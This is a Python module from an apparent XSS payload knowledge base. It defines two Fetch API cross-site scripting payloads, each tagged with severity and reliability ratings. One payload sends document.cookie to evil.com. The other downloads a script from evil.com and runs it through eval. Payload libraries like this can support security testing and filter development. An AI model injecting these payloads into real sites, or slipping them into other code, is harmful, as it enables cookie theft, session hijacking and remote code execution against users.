#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Fetch API XSS Payloads
"""

from ..models import PayloadEntry


FETCH_PAYLOADS = {
    "fetch_exfil": PayloadEntry(
        payload="<script>fetch('//evil.com/?'+document.cookie)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Fetch cookie exfil",
        tags=["fetch", "exfil", "cookie"],
        reliability="high",
    ),
    "fetch_then_eval": PayloadEntry(
        payload="<script>fetch('//evil.com/xss.js').then(r=>r.text()).then(eval)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Fetch then eval",
        tags=["fetch", "eval"],
        reliability="high",
    ),
}

FETCH_PAYLOADS_TOTAL = len(FETCH_PAYLOADS)
